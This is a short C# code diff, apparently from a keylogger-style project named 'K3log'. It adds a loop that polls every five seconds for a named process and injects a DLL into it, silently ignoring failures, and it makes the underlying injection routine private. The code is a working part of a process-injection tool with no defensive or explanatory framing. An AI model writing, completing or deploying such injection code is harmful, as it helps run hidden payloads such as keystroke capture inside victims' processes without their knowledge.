@@ -6,6 +6,7 @@ using System.Runtime.ConstrainedExecution;
 using System.Runtime.InteropServices;
 using System.Security;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace K3log
@@ -115,9 +116,29 @@ namespace K3log
         [return: MarshalAs(UnmanagedType.Bool)]
         static extern bool CloseHandle(IntPtr hObject);
 
+        public void monitorProcAndInj(String procName, string DllPath) {
+            bool inj = false;
+            while (!inj) {
+                
+                var processes = Process.GetProcessesByName(procName);
+                foreach (var p in processes)
+                {
+                   int pid =  p.Id;
+                    try
+                    {
+                        startInj(pid, DllPath);
+                        inj = true;
+                    }
+                    catch { 
+                        
+                    }
+                }
+                Thread.Sleep(5000);
+            }
+        
+        }
 
-
-        public void startInj(int ProcId, string DllPath) {
+        private void startInj(int ProcId, string DllPath) {
             IntPtr Size;
             Size = (IntPtr)DllPath.Length;
 
